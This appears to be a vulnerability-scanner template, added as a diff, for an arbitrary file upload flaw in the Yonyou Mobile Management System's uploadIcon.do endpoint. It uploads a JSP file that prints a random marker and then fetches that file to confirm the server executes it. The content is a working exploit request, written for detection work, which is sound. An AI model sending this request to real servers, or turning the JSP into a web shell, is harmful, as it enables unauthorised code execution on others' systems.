@@ -1,0 +1,50 @@
+id: poc-yaml-yongyou-yidong-manager-system-uploadicondo-anyfile-upload
+info:
+  name: Yongyou Mobile Management System uploadIcon.do Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  filename: "{{rand_base(6)}}"
+  content: "{{rand_base(32)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/maportal/appmanager/uploadIcon.do"
+    headers:
+      Content-Type: "multipart/form-data; boundary=b4e8eb7e0392a9158c610b1875784406"
+    body: |
+      --b4e8eb7e0392a9158c610b1875784406
+      Content-Disposition: form-data; name="iconFile"; filename="{{filename}}.jsp"
+
+      <% out.println("{{content}}"); %>
+      --b4e8eb7e0392a9158c610b1875784406--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "status"
+
+  - id: verify-file
+    method: GET
+    path:
+      - "{{BaseURL}}/maupload/img/{{filename}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{content}}"
